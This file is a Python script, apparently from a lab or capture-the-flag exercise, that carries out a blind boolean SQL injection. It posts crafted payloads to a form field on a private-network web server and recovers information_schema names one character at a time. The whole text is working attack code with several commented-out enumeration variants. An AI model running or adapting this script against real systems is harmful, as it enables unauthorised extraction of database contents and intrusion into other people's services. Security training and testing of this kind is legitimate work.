import requests

url = "http://10.10.8.11:8777/"
chars = "abcdefghijklmnopqrstuvwxyz01234567890."

db = "diana"

for i in range(2022,2025):
    print(i)
    table = ""
    while True:
        br = True
        for char in chars:
            l = len(table)+1
            #expr = f"MID((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT {i},1),{l},1)='{char}'"
            #expr = f"MID((SELECT table_schema FROM information_schema.TABLES LIMIT {i},1),{l},1)='{char}'"
            #expr = f"MID((SELECT table_name FROM information_schema.TABLES LIMIT {i},1),{l},1)='{char}'"
            #expr = f"MID((SELECT table_name FROM information_schema.columns LIMIT {i},1),{l},1)='{char}'"
            expr = f"MID((SELECT COLUMN_NAME FROM information_schema.columns LIMIT {i},1),{l},1)='{char}'"
            data = {"felado": "'AND " + expr +"#"}
            resp = requests.post(url, data = data)
            found = "<img" in resp.text
            if found:
                table = table + char
                br = False
                #br = ( l != 2 and table != "d")
                #br = ( l != 2 and table != "l")
                print(table)
                break
        if br:
            break
